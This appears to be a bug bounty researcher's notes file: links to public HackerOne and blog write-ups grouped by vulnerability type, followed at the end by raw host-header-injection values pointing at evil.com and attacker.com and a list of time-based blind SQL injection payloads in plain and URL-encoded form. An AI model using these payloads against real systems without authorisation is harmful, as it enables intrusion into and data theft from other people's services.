
```
https://bugcrowd.com/sorare
https://bugcrowd.com/kiteworks
https://medium.com/@bathinivijaysimhareddy/tale-of-account-takeovers-part-1-b24e1f3c3187
https://hackerone.com/reports/1356845

一个沙雕
https://hackerone.com/jaka_tingkir?type=user
有很多dos的报告
https://hackerone.com/cs_money/hacktivity?type=team
```

# Bug Bounty Reference

### sqli
- [My Bug Bounty Journey and My First Critical Bug — Time Based Blind SQL Injection](https://marxchryz.medium.com/my-bug-bounty-journey-and-my-first-critical-bug-time-based-blind-sql-injection-aa91d8276e41)

### SSRF 
- [Stored XSS, and SSRF in Google using the Dataset Publishing Language](https://s1gnalcha0s.github.io/dspl/2018/03/07/Stored-XSS-and-SSRF-Google.html) by Craig Arendt
- [SSRF in Exchange leads to ROOT access in all instances](https://hackerone.com/reports/341876) by 0xacb

### Direct Object Reference (IDOR)
- [IDOR for X-Pid header allowed user with observer role to elevate privileges for SQS service of MCS (sqs.mcs.mail.ru) by using role from the different project.](https://hackerone.com/reports/1177451) by mrd0x1

### Unrestricted File Upload
- [Shell upload in http://widget.support.my.com/](https://hackerone.com/reports/317043) by danila
- [Unrestricted file upload on [ambassador.mail.ru]](https://hackerone.com/reports/854032) by organdonor

### Authentication Bypass
- [Improper Authentication - any user can login as other user with otp/logout & otp/login](https://hackerone.com/reports/921780) by korniltsev
- [Change any Uber user's password through /rt/users/passwordless-signup - Account Takeover (critical)](https://hackerone.com/reports/143717) by mongo
- [Account Takeover at worki.ru](https://hackerone.com/reports/725707) by r0hack
- [Forgot Password Page SMS Brute Force could lead to Account Takeover using Android/IOS app "About the house" via api.prodom.smart.space](https://hackerone.com/reports/944392) by jayesh25
- [Account takeover through password reset in cups.mail.ru](https://hackerone.com/reports/843160) by weev3kyaw
- [Lack of rate limitation on careers site allows the attacker to brute force the verification code](https://hackerone.com/reports/1075827) by iambouali
- [Full account takeover of any user through reset password](https://hackerone.com/reports/1175081) by saajanbhujel
- [Password reset link injection allows redirect to malicious URL](https://hackerone.com/reports/281575) by cablej 
- [Password Reset - query param overrides postdata](https://hackerone.com/reports/96636) by reecer

### Business Logic Flaw
- [Modify in-flight data to payment provider Smart2Pay](https://hackerone.com/reports/1295844) by drbrix
```
Amount=2000&CustomerEmail=brixamount100abc%40███████&Hash=███
Amount2=000&CustomerEmail=brix&amount=100&ab=c%40██████████&Hash=█████████
```

### Miscellaneous
- [Bypass Rate Limits on app.snapchat.com API Endpoint via X-Forwarded-For Header](https://hackerone.com/reports/727487) by sicarius
- [Client IP Spoofing using "X-Forwarded-For: 127.0.0.1" on "studio-app.snapchat.com" exposing bucket details](https://hackerone.com/reports/382678) by damian89
- [Error Page Content Spoofing or Text Injection](https://hackerone.com/reports/1245051) by princej_76
- [Password reset link not expiring after changing password in settings](https://hackerone.com/reports/1288898) by blackbibin


### recon win 
- [API on campus-vtc.com allows access to ~100 Uber users full names, email addresses and telephone numbers.](https://hackerone.com/reports/580268) by healdb
- [Administrator access to a Django Administration Panel on *.sc-corp.net via bruteforced credentials](https://hackerone.com/reports/128114) by shubs


host-header-injection
```
Host: example.com?.mavenlink.com
X-Forwarded-Host: evil.com
Referrer: https://evil.com
localhost.attacker.com or localhostattacker.com
Host: redacted.com?anythin<b>imran</b> or Host: redacted.com?"><a href='evil.com
```

SQL INJECT
```
'and(select*from(select+sleep(30))a/**/union/**/select+1)='
%27and%28select%2Afrom%28select%2Bsleep%2830%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%27
'XOR(if(now()=sysdate(),sleep(30),0))OR'
%27XOR(if(now()%3dsysdate(),sleep(30),0))OR%27
"and(select*from(select+sleep(30))a/**/union/**/select+1)="
%22and%28select%2Afrom%28select%2Bsleep%2830%29%29a%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2B1%29%3D%22
"XOR(if(now()=sysdate(),sleep(30),0))OR"
%22XOR(if(now()%3dsysdate(),sleep(30),0))OR%22
```


